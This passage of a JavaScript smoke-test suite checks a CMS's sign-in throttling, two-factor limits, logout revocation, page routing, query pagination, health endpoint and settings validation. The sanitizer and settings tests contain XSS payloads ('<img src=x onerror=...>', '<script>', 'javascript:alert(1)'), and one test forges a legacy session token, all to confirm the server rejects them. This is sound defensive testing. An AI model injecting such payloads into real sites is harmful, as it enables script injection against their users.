        ok('S3.9: ...then even the RIGHT password needs proof-of-work (403 POW_REQUIRED + a challenge)');
      } else fail('S3.9 proof required', `status=${noProof.status} ${JSON.stringify(np?.error)}`);
      if (!cookieFrom(noProof, 'astrobaas_session')) ok('S3.9: ...and no session is issued without it');
      else fail('S3.9 session without proof', 'a session cookie was set');

      if (challenge?.token) {
        const proof = solvePow(challenge.token, challenge.bits);
        const withProof = await jsonLogin({ email: OWNER, password: PW, pow_token: proof });
        if (withProof.status === 200 && cookieFrom(withProof, 'astrobaas_session')) {
          ok('S3.9: with the proof, the owner signs in — slowed, never locked out');
        } else fail('S3.9 owner with proof', `status=${withProof.status}`);
      }

      const form = await fetch(`${BASE}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ email: OWNER, password: PW, next: '/admin' }).toString(),
        redirect: 'manual',
      });
      if (form.status === 303 && (form.headers.get('location') || '').startsWith('/login?error=pow')) {
        ok('S3.9: the sign-in form is sent back to the page that solves it');
      } else fail('S3.9 form redirect', `status=${form.status} location=${form.headers.get('location')}`);

      const page = await (await fetch(`${BASE}/login?error=pow`)).text();
      if (/data-captcha-token="[^"]+\.[^"]+"/.test(page) && /data-captcha-bits="\d+"/.test(page)) {
        ok('S3.9: the sign-in page carries a challenge for /captcha.js to solve');
      } else fail('S3.9 page challenge', 'no data-captcha-token on /login');

      const other = await jsonLogin({ email: 'resettest@example.com', password: 'Rotated#Pass2' });
      if (other.status === 200) ok('S3.9: other accounts are unaffected');
      else fail('S3.9 other account', `status=${other.status}`);
    } else fail('S3.9 setup', 'could not create the probe account');
  }

  // 13c. S3.10 — the two-factor step is counted per account.
  {
    const EMAIL = 'twofa-probe@example.com';
    const PW = 'TwoFa#Pass1';
    const { totp } = await loadTotp();
    let secret = '';
    if (await makeUser(EMAIL, PW)) {
      // Sign in as the probe; the JSON sign-in hands a cookie-less client its
      // CSRF token (S3.13), which is exactly what this script needs next.
      const first = await jsonLogin({ email: EMAIL, password: PW });
      const sess = cookieFrom(first, 'astrobaas_session');
      const csrfPair = cookieFrom(first, 'astrobaas_csrf');
      const tok = decodeURIComponent(csrfPair.split('=')[1] ?? '');
      if (first.status === 200 && sess && tok) ok('S3.13: a JSON sign-in hands a cookie-less script its CSRF token');
      else fail('S3.13 json login csrf', `status=${first.status} session=${!!sess} csrf=${!!tok}`);
      const as = (p, body) => fetch(`${BASE}${p}`, {
        method: 'POST',
        headers: { Cookie: `${sess}; ${csrfPair}`, 'Content-Type': 'application/json', 'X-CSRF-Token': tok },
        body: JSON.stringify(body ?? {}),
      });
      secret = (await (await as('/api/2fa/setup')).json().catch(() => null))?.data?.secret ?? '';
      const enabled = secret ? (await as('/api/2fa/enable', { code: totp(secret) })).status : 0;
      if (enabled !== 200) fail('S3.10 setup', `secret=${!!secret} enable=${enabled}`);
    } else fail('S3.10 setup', 'could not create the probe account');

    if (secret) {
      await clearOfLoginWindowBoundary();
      const step1 = await jsonLogin({ email: EMAIL, password: PW });
      const pending = cookieFrom(step1, 'astrobaas_2fa_pending');
      const real = totp(secret);
      const wrongCode = String((Number(real) + 500_000) % 1_000_000).padStart(6, '0');
      const statuses = [];
      for (let i = 0; i < 11; i += 1) statuses.push((await jsonLogin({ code: wrongCode }, pending)).status);
      if (statuses.slice(0, 10).every((s) => s === 401) && statuses[10] === 429) {
        ok('S3.10: ten wrong codes are 401s, the eleventh is 429');
      } else fail('S3.10 code throttle', JSON.stringify(statuses));
      const rightButLate = await jsonLogin({ code: totp(secret) }, pending);
      if (rightButLate.status === 429) ok('S3.10: ...and even the right code waits out the window');
      else fail('S3.10 right code after throttle', `status=${rightButLate.status}`);
      // The inline path (password + code together) shares the same counter.
      const inline = await jsonLogin({ email: EMAIL, password: PW, code: totp(secret) });
      if (inline.status === 429) ok('S3.10: the password+code path shares the counter');
      else fail('S3.10 inline path', `status=${inline.status}`);
    }
  }

  // 13d. S3.11 — signing out revokes THAT token, on the server.
  {
    const EMAIL = 'logout-probe@example.com';
    const PW = 'Logout#Pass1';
    if (await makeUser(EMAIL, PW)) {
      const a = cookieFrom(await jsonLogin({ email: EMAIL, password: PW }), 'astrobaas_session');
      const b = cookieFrom(await jsonLogin({ email: EMAIL, password: PW }), 'astrobaas_session');
      const me = (c) => fetch(`${BASE}/api/auth/me`, { headers: { Cookie: c } });
      const out = await fetch(`${BASE}/api/auth/logout`, { method: 'POST', headers: { Cookie: a, 'Content-Type': 'application/json' }, body: '{}' });
      if (out.status === 200) ok('S3.11: sign-out answers as before');
      else fail('S3.11 logout', `status=${out.status}`);
      if ((await me(a)).status === 401) ok('S3.11: a signed-out token is refused even when replayed');
      else fail('S3.11 replay', 'the signed-out token still authenticates');
      const page = await fetch(`${BASE}/admin`, { headers: { Cookie: a }, redirect: 'manual' });
      if (page.status >= 300 && page.status < 400) ok('S3.11: ...on admin pages too');
      else fail('S3.11 replay page', `status=${page.status}`);
      if ((await me(b)).status === 200) ok('S3.11: the same person\'s other device stays signed in');
      else fail('S3.11 other device', 'signing out one token signed out another');

      // A token minted before tokens had ids: the fallback signs out everywhere.
      const uid = (await (await me(b)).json().catch(() => null))?.data?.id;
      if (uid) {
        const legacyBody = Buffer.from(JSON.stringify({ uid, role: 'author', sv: 0, iat: Date.now(), exp: Date.now() + 3_600_000 })).toString('base64url');
        const legacySig = crypto.createHmac('sha256', SMOKE_AUTH_SECRET).update(legacyBody).digest('base64url');
        const legacy = `astrobaas_session=${legacyBody}.${legacySig}`;
        if ((await me(legacy)).status === 200) ok('S3.11: a pre-upgrade token (no id) still works — nobody is signed out by the deploy');
        else fail('S3.11 legacy token', 'a token without an id was refused');
        await fetch(`${BASE}/api/auth/logout`, { method: 'POST', headers: { Cookie: legacy, 'Content-Type': 'application/json' }, body: '{}' });
        const legacyAfter = (await me(legacy)).status;
        const bAfter = (await me(b)).status;
        if (legacyAfter === 401 && bAfter === 401) ok('S3.11: signing out a pre-upgrade token signs the account out everywhere');
        else fail('S3.11 legacy fallback', `legacy=${legacyAfter} other=${bAfter}`);
      }
    } else fail('S3.11 setup', 'could not create the probe account');
  }


  /* ------------------------------------------------------------------ *
   * Pages, sections and the designated home page.
   *
   * These run against every storage driver because the whole feature is one
   * stored field (`Post.kind`) plus one setting, and a driver that drops
   * either would fail silently: the page would still save, it would just stop
   * being a page — served from the blog, listed in the feed, 404 at its own URL.
   * ------------------------------------------------------------------ */
  if (sessionCookie && csrfToken) {
    const pHdrs = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const pageSlug = `smoke-page-${Date.now().toString(36)}`;
    const artSlug = `smoke-article-${Date.now().toString(36)}`;
    // Real section markup, so this also proves the sanitizer's generated
    // allow-list survives a round trip through this driver.
    const sectionHtml =
      '<div class="ab-hero ab-align-center"><h2>Hello</h2></div>'
      + '<div class="ab-columns ab-cols-2"><div class="ab-col"><p>L</p></div><div class="ab-col"><p>R</p></div></div>';

    const mk = (body) => fetch(`${BASE}/api/posts`, { method: 'POST', headers: pHdrs, body: JSON.stringify(body) });
    await mk({ title: 'Smoke Page', slug: pageSlug, content: sectionHtml, status: 'published', kind: 'page' });
    await mk({ title: 'Smoke Article', slug: artSlug, content: '<p>article</p>', status: 'published' });

    // `kind` must round-trip through the driver, not merely be echoed back.
    const stored = (await (await fetch(`${BASE}/api/posts/${pageSlug}`, { headers: pHdrs })).json().catch(() => null))?.data;
    if (stored?.kind === 'page') ok('page: kind persists through the storage driver');
    else fail('page kind persisted', `got ${JSON.stringify(stored?.kind)}`);

    const pageRes = await fetch(`${BASE}/${pageSlug}`);
    const pageHtml = await pageRes.text();
    if (pageRes.status === 200 && pageHtml.includes('ab-hero') && pageHtml.includes('ab-cols-2'))
      ok('page: renders at /{slug} with its section classes intact');
    else fail('page renders at root', `status=${pageRes.status}`);

    // One canonical URL only.
    const viaBlog = await fetch(`${BASE}/blog/${pageSlug}`, { redirect: 'manual' });
    if (viaBlog.status !== 200) ok('page: not also served under /blog/{slug}');
    else fail('page duplicated under /blog', 'status=200');

    if ((await fetch(`${BASE}/blog/${artSlug}`)).status === 200) ok('article: still resolves at /blog/{slug}');
    else fail('article permalink', 'not 200');

    // The archive, the feed and the default API response must be unchanged for
    // anyone who has not created a page — i.e. pages must be excluded.
    const archive = await (await fetch(`${BASE}/blog`)).text();
    if (!archive.includes('Smoke Page') && archive.includes('Smoke Article'))
      ok('page: absent from the blog archive, article present');
    else fail('archive contents', 'page leaked into /blog or article missing');

    const feed = await (await fetch(`${BASE}/rss.xml`)).text();
    if (!feed.includes('Smoke Page') && feed.includes('Smoke Article'))
      ok('page: absent from the RSS feed, article present');
    else fail('feed contents', 'page leaked into rss.xml or article missing');

    const listSlugs = ((await (await fetch(`${BASE}/api/posts`)).json().catch(() => null))?.data ?? []).map((p) => p.slug);
    if (!listSlugs.includes(pageSlug) && listSlugs.includes(artSlug))
      ok('GET /api/posts excludes pages by default (storefront response unchanged)');
    else fail('api default list', `slugs=${listSlugs.join(',')}`);

    const onlyPages = ((await (await fetch(`${BASE}/api/posts?kind=page`)).json().catch(() => null))?.data ?? []).map((p) => p.slug);
    if (onlyPages.includes(pageSlug) && !onlyPages.includes(artSlug)) ok('GET /api/posts?kind=page returns pages only');
    else fail('api ?kind=page', `slugs=${onlyPages.join(',')}`);

    const both = ((await (await fetch(`${BASE}/api/posts?kind=all`)).json().catch(() => null))?.data ?? []).map((p) => p.slug);
    if (both.includes(pageSlug) && both.includes(artSlug)) ok('GET /api/posts?kind=all returns both');
    else fail('api ?kind=all', `slugs=${both.join(',')}`);

    // An unpublished page must 404 rather than 403 — a 403 confirms the slug.
    const draftSlug = `smoke-draft-page-${Date.now().toString(36)}`;
    await mk({ title: 'Smoke Draft Page', slug: draftSlug, content: '<p>x</p>', status: 'draft', kind: 'page' });
    if ((await fetch(`${BASE}/${draftSlug}`)).status === 404) ok('page: an unpublished page 404s for anonymous callers');
    else fail('draft page visibility', 'not 404');
    if ((await fetch(`${BASE}/${draftSlug}`, { headers: { Cookie: sessionCookie } })).status === 200)
      ok('page: staff can still view their unpublished page');
    else fail('draft page for staff', 'not 200');

    // Sitemap: root path, no /blog duplicate, no repeats.
    const smLocs = [...(await (await fetch(`${BASE}/sitemap.xml`)).text()).matchAll(/<loc>([^<]+)<\/loc>/g)]
      .map((m) => m[1].replace(/^https?:\/\/[^/]+/, ''));
    if (smLocs.includes(`/${pageSlug}`) && !smLocs.includes(`/blog/${pageSlug}`) && smLocs.includes(`/blog/${artSlug}`))
      ok('sitemap: page at its root path, article under /blog');
    else fail('sitemap paths', smLocs.join(' '));
    if (new Set(smLocs).size === smLocs.length) ok('sitemap: no duplicate URLs');
    else fail('sitemap duplicates', smLocs.join(' '));

    // The truthful preview: real pipeline, sanitized, staff only.
    const previewForm = (content) => ({
      method: 'POST',
      headers: { Cookie: sessionCookie, 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({ title: 'Preview', content }).toString(),
      redirect: 'manual',
    });
    const pv = await fetch(`${BASE}/admin/posts/preview`, previewForm('<div class="ab-card"><p>hi</p></div>'));
    if (pv.status === 200 && (await pv.text()).includes('ab-card')) ok('preview: renders through the real pipeline');
    else fail('preview render', `status=${pv.status}`);
    const evil = await (await fetch(`${BASE}/admin/posts/preview`,
      previewForm('<img src=x onerror=alert(1)><script>alert(2)</script>'))).text();
    if (!/onerror|alert\(2\)/.test(evil)) ok('preview: sanitizes the HTML it previews');
    else fail('preview sanitize', 'script or handler survived');
    const anonPv = await fetch(`${BASE}/admin/posts/preview`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'title=x&content=y',
      redirect: 'manual',
    });
    if ([301, 302, 303, 307, 308, 401, 403].includes(anonPv.status)) ok('preview: refuses anonymous callers');
    else fail('preview auth', `status=${anonPv.status}`);

    // home_page_slug: designating, falling back, and clearing.
    const setHome = (v) => fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: pHdrs, body: JSON.stringify({ home_page_slug: v }),
    });
    // A marker from the stock home page's BODY, not its tagline: the tagline
    // now also appears inside the WebSite structured data on every home page,
    // so matching on it would report "the stock page is showing" whichever
    // page is actually served. A marker that can match for a reason unrelated
    // to what it claims to measure is the failure mode this suite has been
    // bitten by before.
    const STOCK = 'Powered by Astro, designed for performance';
    if ((await (await fetch(`${BASE}/`)).text()).includes(STOCK)) ok('home: defaults to the stock welcome page');
    else fail('default homepage', 'stock page not rendered');

    await setHome(pageSlug);
    const homeHtml = await (await fetch(`${BASE}/`)).text();
    if (homeHtml.includes('ab-hero') && !homeHtml.includes(STOCK)) ok('home: home_page_slug serves that page at /');
    else fail('designated homepage', 'page not served at /');
    const homeCanon = (homeHtml.match(/rel="canonical"[^>]*href="([^"]+)"/) || [])[1];
    if (!homeCanon || !homeCanon.includes(pageSlug)) ok('home: canonical points at the origin, not /{slug}');
    else fail('home canonical', homeCanon);

    // A setting pointing at nothing must not take the front page down.
    await setHome('a-slug-that-does-not-exist');
    if ((await (await fetch(`${BASE}/`)).text()).includes(STOCK)) ok('home: a stale slug falls back to the default page');
    else fail('stale home slug', 'homepage did not fall back');

    // Designating a draft does not publish it.
    await setHome(draftSlug);
    if (!(await (await fetch(`${BASE}/`)).text()).includes('Smoke Draft Page')) ok('home: a draft designated as home stays private');
    else fail('draft homepage leaked', 'visible to anonymous');

    await setHome('');
    if ((await (await fetch(`${BASE}/`)).text()).includes(STOCK)) ok('home: clearing the setting restores the default');
    else fail('clearing home slug', 'default not restored');
  }


  /* ------------------------------------------------------------------ *
   * Filtered/paginated reads (Phase K) — the DIFFERENTIAL check.
   *
   * `queryPosts` has two implementations: the shared in-memory specification
   * in src/core/post-query.ts that the doc drivers run, and SQL that the
   * relational driver builds. Two implementations of a filter is two chances
   * to disagree, and a disagreement here is silent — pagination that skips a
   * row, or a `total` that stops the reader a page early.
   *
   * This runs the same queries through the HTTP API on whichever driver is
   * under test and asserts the invariants that must hold identically on all
   * three. Run across the matrix (npm run smoke, smoke:libsql,
   * smoke:relational) it is a differential test.
   * ------------------------------------------------------------------ */
  if (sessionCookie && csrfToken) {
    const qHdrs = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const tag = `q${Date.now().toString(36)}`;
    // A known corpus: 7 articles + 2 pages + 1 draft, all identifiable by slug.
    for (let i = 0; i < 7; i++) {
      await fetch(`${BASE}/api/posts`, { method: 'POST', headers: qHdrs, body: JSON.stringify({
        title: `Query ${tag} ${i}`, slug: `${tag}-a${i}`, status: 'published', content: `<p>body ${i}</p>` }) });
    }
    for (let i = 0; i < 2; i++) {
      await fetch(`${BASE}/api/posts`, { method: 'POST', headers: qHdrs, body: JSON.stringify({
        title: `Query ${tag} page ${i}`, slug: `${tag}-p${i}`, status: 'published', kind: 'page', content: '<p>pg</p>' }) });
    }
    await fetch(`${BASE}/api/posts`, { method: 'POST', headers: qHdrs, body: JSON.stringify({
      title: `Query ${tag} draft`, slug: `${tag}-d0`, status: 'draft', content: '<p>d</p>' }) });

    const q = async (qs, headers) => {
      const r = await fetch(`${BASE}/api/posts${qs}`, headers ? { headers } : undefined);
      const j = await r.json().catch(() => null);
      return { status: r.status, items: j?.data ?? [], meta: j?.meta ?? {} };
    };
    const mine = (items) => items.filter((p) => String(p.slug).startsWith(tag)).map((p) => p.slug);

    // Anonymous sees published articles only — no pages, no drafts.
    const anon = await q('?limit=200');
    const anonSlugs = mine(anon.items);
    if (anonSlugs.length === 7 && !anonSlugs.some((s) => s.includes('-p')) && !anonSlugs.some((s) => s.includes('-d')))
      ok('queryPosts: anonymous gets published articles only');
    else fail('queryPosts anon set', anonSlugs.join(','));

    const pagesOnlyRes = await q('?kind=page&limit=200');
    const pageSlugs = mine(pagesOnlyRes.items);
    if (pageSlugs.length === 2 && pageSlugs.every((s) => s.includes('-p')))
      ok('queryPosts: ?kind=page returns pages only');
    else fail('queryPosts kind=page', pageSlugs.join(','));

    const allRes = await q('?kind=all&limit=200');
    if (mine(allRes.items).length === 9) ok('queryPosts: ?kind=all returns both (drafts still hidden)');
    else fail('queryPosts kind=all', mine(allRes.items).length);

    // An admin sees the draft; anonymous does not. Visibility survived the
    // move into the query layer.
    const asAdmin = await q('?limit=200', { Cookie: sessionCookie });
    if (mine(asAdmin.items).some((s) => s.includes('-d0'))) ok('queryPosts: staff still see drafts');
    else fail('queryPosts admin draft', 'draft missing for admin');
    if (!anonSlugs.some((s) => s.includes('-d0'))) ok('queryPosts: anonymous still cannot');
    else fail('queryPosts anon draft', 'draft leaked');

    // Pagination: every row exactly once, and `total` counts matches not the page.
    const seen = [];
    let totalReported = -1;
    for (let off = 0; off < 12; off += 3) {
      const page = await q(`?kind=all&limit=3&offset=${off}`);
      totalReported = page.meta.total;
      seen.push(...page.items.map((p) => p.slug));
    }
    const minePaged = seen.filter((s) => String(s).startsWith(tag));
    if (new Set(minePaged).size === minePaged.length) ok('queryPosts: paging never repeats a row');
    else fail('queryPosts duplicate rows', minePaged.join(','));
    if (minePaged.length === 9) ok('queryPosts: paging visits every matching row');
    else fail('queryPosts missing rows', `${minePaged.length}/9`);
    if (totalReported >= 9) ok('queryPosts: total counts matches, not the page');
    else fail('queryPosts total', totalReported);

    // Ordering is stable and newest-first — the property a total sort protects.
    const p1 = await q('?kind=all&limit=5&offset=0');
    const p1again = await q('?kind=all&limit=5&offset=0');
    if (p1.items.map((p) => p.id).join() === p1again.items.map((p) => p.id).join())
      ok('queryPosts: repeating a query returns the same order');
    else fail('queryPosts unstable order', 'two identical queries differed');
    // Newest-first AMONG the rows that carry no pin and no manual position —
    // which is every row on an existing site, and is what makes the C-149
    // ordering a no-op until an editor actually pins something. The pinned and
    // positioned rows are asserted separately, in the ordering block above;
    // repeating that here would only re-test the comparator.
    //
    // The guard this preserves is the one that matters: the three drivers must
    // agree. A bare `ORDER BY json_extract(...)` on the relational driver
    // returns NULL for every pre-existing row and sorts them all wrong, and
    // this suite running on all three is the only thing that would catch it.
    const plainRows = p1.items.filter((p) => !p.pinned && p.menu_order === undefined);
    const times = plainRows.map((p) => new Date(p.created_at).getTime());
    if (times.every((t, i) => i === 0 || times[i - 1] >= t)) ok('queryPosts: newest first among unpinned rows');
    else fail('queryPosts order', times.join(','));
    const pinnedFirst = p1.items.findIndex((p) => !p.pinned);
    if (pinnedFirst === -1 || !p1.items.slice(pinnedFirst).some((p) => p.pinned)) {
      ok('queryPosts: every pinned row precedes every unpinned one');
    } else fail('queryPosts pin grouping', p1.items.map((p) => `${p.slug}:${p.pinned ? 'pin' : '-'}`).join(','));

    // An offset past the end is empty, not an error.
    const far = await q('?kind=all&limit=5&offset=100000');
    if (far.status === 200 && far.items.length === 0) ok('queryPosts: offset past the end is an empty page');
    else fail('queryPosts far offset', `status=${far.status} n=${far.items.length}`);

    // status= and the response envelope are unchanged for existing callers.
    const drafts = await q('?status=draft&limit=200', { Cookie: sessionCookie });
    if (mine(drafts.items).every((s) => s.includes('-d'))) ok('queryPosts: ?status= filters');
    else fail('queryPosts status filter', mine(drafts.items).join(','));
    const envelope = await q('?limit=2');
    const m = envelope.meta;
    if (typeof m.total === 'number' && typeof m.count === 'number' && m.limit === 2
        && typeof m.offset === 'number' && typeof m.page === 'number' && typeof m.hasMore === 'boolean')
      ok('queryPosts: the response envelope is unchanged (total/count/limit/offset/page/hasMore)');
    else fail('queryPosts envelope', JSON.stringify(m));
    if (m.hasMore === true) ok('queryPosts: hasMore is true when rows remain');
    else fail('queryPosts hasMore', JSON.stringify(m));
  }

  /* ------------------------------------------------------------------
   * The deep health check, and the setting it exists to police
   * ------------------------------------------------------------------
   * Every production problem this month looked healthy from outside: pages
   * 200, images rendered, nothing in the error log. So this endpoint's whole
   * value is that it EXERCISES things rather than introspecting them, and
   * answers non-200 when one is broken — which is what makes it assertable
   * from a deploy script.
   * ------------------------------------------------------------------ */
  if (sessionCookie && csrfToken) {
    const hHdrs = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };

    // Anonymous callers get a 404, not a 403: whether a deep health endpoint
    // exists is itself information about the install.
    const anon = await fetch(`${BASE}/api/health/deep`);
    if (anon.status === 404) ok('health/deep: anonymous callers get 404, not a hint');
    else fail('health/deep anonymous', `expected 404, got ${anon.status}`);

    const badToken = await fetch(`${BASE}/api/health/deep`, {
      headers: { Authorization: 'Bearer definitely-not-the-health-token' },
    });
    if (badToken.status === 404) ok('health/deep: a wrong bearer token gets 404');
    else fail('health/deep bad token', `expected 404, got ${badToken.status}`);

    const res = await fetch(`${BASE}/api/health/deep`, { headers: { Cookie: sessionCookie } });
    const hj = await res.json().catch(() => ({}));
    if (res.status === 200 || res.status === 503) ok('health/deep: an admin session can read it');
    else fail('health/deep admin', `status=${res.status}`);

    if ((res.headers.get('cache-control') || '').includes('no-store'))
      ok('health/deep: the response is not cacheable');
    else fail('health/deep caching', `Cache-Control=${res.headers.get('cache-control')}`);

    const byName = Object.fromEntries((hj.checks || []).map((c) => [c.name, c]));
    for (const n of ['image_pipeline', 'uploads_writable', 'public_site_url', 'database', 'rate_limit_store', 'plugins', 'media_records', 'cors_origins', 'offsite_backup']) {
      if (byName[n]) ok(`health/deep: reports ${n}`);
      else fail('health/deep missing check', n);
    }
    // No bucket on this server: reported, and never a failure or a warning.
    if (byName.offsite_backup?.status === 'ok' && byName.offsite_backup?.data?.configured === false)
      ok('health/deep: an unconfigured off-site backup is reported as ok');
    else fail('offsite_backup check', JSON.stringify(byName.offsite_backup));

    // Stripe is enabled in this suite, so return URLs matter. Whatever Site URL
    // earlier blocks left behind, the check is advice: warn or ok, never fail.
    if (byName.payment_return_urls && ['ok', 'warn'].includes(byName.payment_return_urls.status)
        && !(hj.failed || []).includes('payment_return_urls'))
      ok(`health/deep: reports where payments return buyers, as advice only (${byName.payment_return_urls.status})`);
    else fail('payment_return_urls check', JSON.stringify(byName.payment_return_urls));
    // S3.14: this suite names one origin, so the CORS check is clean. The
    // wildcard warning itself is unit-tested (tests/request-limits.test.mjs).
    if (byName.cors_origins?.status === 'ok' && byName.cors_origins?.data?.wildcard === false) {
      ok('health/deep: a named CORS origin list is not flagged');
    } else fail('health/deep cors', JSON.stringify(byName.cors_origins));

    // Not "the module is present" — it encoded an image just now.
    if (byName.image_pipeline?.status === 'ok'
        && /encoded a test image/.test(byName.image_pipeline.detail || ''))
      ok('health/deep: the image pipeline check actually encodes an image');
    else fail('image pipeline check', JSON.stringify(byName.image_pipeline));

    if (byName.uploads_writable?.status === 'ok') ok('health/deep: proves the uploads dir is writable');
    else fail('uploads check', JSON.stringify(byName.uploads_writable));

    if (byName.database?.status === 'ok' && byName.database?.data?.write_probe === true)
      ok('health/deep: proves the database is WRITABLE, not merely readable');
    else fail('database check', JSON.stringify(byName.database));

    if (byName.rate_limit_store?.status === 'ok' || byName.rate_limit_store?.status === 'warn')
      ok(`health/deep: reports the rate-limit store (${byName.rate_limit_store?.data?.kind})`);
    else fail('rate limit check', JSON.stringify(byName.rate_limit_store));

    // A frequent poller must be able to skip the write.
    const noWrite = await fetch(`${BASE}/api/health/deep?write=0`, { headers: { Cookie: sessionCookie } });
    const nwj = await noWrite.json().catch(() => ({}));
    const dbCheck = (nwj.checks || []).find((c) => c.name === 'database');
    if (dbCheck?.data?.write_probe === false) ok('health/deep: ?write=0 skips the database write probe');
    else fail('write=0', JSON.stringify(dbCheck));

    // --- public_site_url: unset must be LOUD ---
    if (byName.public_site_url?.status === 'warn')
      ok('health/deep: an unset public_site_url is reported, not passed over in silence');
    else fail('unset public_site_url', JSON.stringify(byName.public_site_url));

    // --- the setting cannot be saved wrong ---
    const saveUrl = (v) => fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: hHdrs, body: JSON.stringify({ public_site_url: v }),
    });

    const noScheme = await saveUrl('cms.example.com');
    if (noScheme.status === 400) ok('settings: a media base without a scheme is refused');
    else fail('settings validation', `expected 400, got ${noScheme.status}`);
    const nsj = await noScheme.json().catch(() => ({}));
    if (/https:\/\/cms\.example\.com/.test(JSON.stringify(nsj)))
      ok('settings: ...and the refusal says what to type instead');
    else fail('settings message', JSON.stringify(nsj).slice(0, 200));

    const js = await saveUrl('javascript:alert(1)');
    if (js.status === 400) ok('settings: a javascript: url is refused');
    else fail('javascript url accepted', `status=${js.status}`);

    // A rejected key must not leave the VALID keys in the same form applied.
    // A half-saved form is worse than a rejected one: some of the operator's
    // edit is live, some is not, and the error names only one field.
    const marker = `atomic-${Date.now()}`;
    const mixed = await fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: hHdrs,
      body: JSON.stringify({ site_title: marker, public_site_url: 'not-a-url' }),
    });
    if (mixed.status === 400) ok('settings: a payload with one bad value is refused');
    else fail('mixed payload', `status=${mixed.status}`);
    const check2 = await fetch(`${BASE}/api/settings/get`, { headers: { Cookie: sessionCookie } });
    const cj = await check2.json().catch(() => ({}));
    const rows2 = Array.isArray(cj.data) ? cj.data : Object.entries(cj.data || {}).map(([key, value]) => ({ key, value }));
    if (rows2.find((r) => r.key === 'site_title')?.value !== marker)
      ok('settings: ...and the valid key in that payload was NOT written');
    else fail('partial settings write', 'site_title was applied despite the rejection');

    // A good value is stored CANONICALLY — the trailing slash would otherwise
    // produce `//uploads/...` in every media URL.
    const good = await saveUrl('https://cms.smoke.test/');
    if (good.ok) ok('settings: a proper origin is accepted');
    else fail('settings save', `status=${good.status}`);

    const readBack = await fetch(`${BASE}/api/settings/get`, { headers: { Cookie: sessionCookie } });
    const rj = await readBack.json().catch(() => ({}));
    const rows = Array.isArray(rj.data) ? rj.data : Object.entries(rj.data || {}).map(([key, value]) => ({ key, value }));
    const stored = rows.find((r) => r.key === 'public_site_url')?.value;
    if (stored === 'https://cms.smoke.test') ok('settings: the trailing slash is normalised away on save');
    else fail('settings normalisation', `stored=${JSON.stringify(stored)}`);

    // And the media base follows it IMMEDIATELY — the memo is invalidated on
    // write, so an operator who fixes the setting is not told to wait.
    const after = await fetch(`${BASE}/api/media/get?limit=1`, { headers: { Cookie: sessionCookie } });
    const aj = await after.json().catch(() => ({}));
    if (aj?.meta?.media_base === 'https://cms.smoke.test')
      ok('media: the new base takes effect on the very next request');
    else fail('media base invalidation', `status=${after.status} body=${JSON.stringify(aj).slice(0, 200)}`);

    // Require a record: `!rec || …` would have passed on an empty library,
    // which is an assertion that cannot fail.
    const rec = (aj.data || [])[0];
    if (rec && rec.url_absolute === `https://cms.smoke.test${rec.url}`)
      ok('media: url_absolute is built from the configured base');
    else fail('absolute from setting', `rec=${JSON.stringify(rec)?.slice(0, 160)}`);

    // ...and now the health check stops warning about it.
    const after2 = await fetch(`${BASE}/api/health/deep?write=0`, { headers: { Cookie: sessionCookie } });
    const a2 = await after2.json().catch(() => ({}));
    const psu = (a2.checks || []).find((c) => c.name === 'public_site_url');
    if (psu?.status === 'ok') ok('health/deep: setting public_site_url clears the warning');
    else fail('public_site_url after set', JSON.stringify(psu));

    // Catalogue routes publish the base too, for `images[].src` and
    // `featured_image`, which are not media records and cannot carry a field.
    const prod = await fetch(`${BASE}/api/products?limit=1`);
    const pj = await prod.json().catch(() => ({}));
    if (pj?.meta?.media_base === 'https://cms.smoke.test') ok('products: the envelope publishes media_base');
    else fail('products media_base', JSON.stringify(pj?.meta));

    const posts = await fetch(`${BASE}/api/posts?limit=1`);
    const poj = await posts.json().catch(() => ({}));
    if (poj?.meta?.media_base === 'https://cms.smoke.test') ok('posts: the envelope publishes media_base');
    else fail('posts media_base', JSON.stringify(poj?.meta));

    // Put it back so nothing after this sees a bogus origin.
    await saveUrl('');
  }

  /* ------------------------------------------------------------------
   * Legacy-URL recovery: redirects, the dead-URL report, and STATUS CODES
   * ------------------------------------------------------------------
   * The status codes are the whole point, and they are only provable against a
   * live server: the middleware, the route table and the 404 page each get a
   * say in what a browser finally sees.
   *
   * Two of these are expensive to get wrong in ways that are invisible locally:
   *
   *   - A 410 quietly served as a 301 is a soft 404. The dead address stays
   *     indexed, keeps eating crawl budget, and the shop keeps paying for
   *     clicks that land nowhere.
   *   - A helpful recovery page served as 200 is the same failure wearing a
   *     nicer face — worse, because it looks fixed.
   * ------------------------------------------------------------------ */
  if (sessionCookie && csrfToken) {
    const lHdrs = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const mkRule = (body) => fetch(`${BASE}/api/redirects`, {
      method: 'POST', headers: lHdrs, body: JSON.stringify(body),
    });

    // --- a 301 fires immediately, with no restart ---
    const created = await mkRule({
      match: '/legacy-smoke-old', target: '/blog', status: 301, enabled: true,
    });
    const createdJson = await created.json().catch(() => ({}));
    if (created.status === 201 || created.status === 200) ok('redirects: a rule can be created');
    else fail('redirect create', `status=${created.status} ${JSON.stringify(createdJson).slice(0, 200)}`);

    const hit301 = await fetch(`${BASE}/legacy-smoke-old`, { redirect: 'manual' });
    if (hit301.status === 301) ok('redirects: an entry matches and answers 301 (no restart needed)');
    else fail('redirect 301', `expected 301, got ${hit301.status}`);
    if (hit301.headers.get('location') === '/blog') ok('redirects: ...and points at the target');
    else fail('redirect target', `Location=${hit301.headers.get('location')}`);

    // The click id has to survive, or the recovered visit is invisible in the
    // analytics that justify the ad spend.
    const withClick = await fetch(`${BASE}/legacy-smoke-old?srsltid=abc123`, { redirect: 'manual' });
    if (withClick.headers.get('location') === '/blog?srsltid=abc123')
      ok('redirects: the ad click id is carried to the destination');
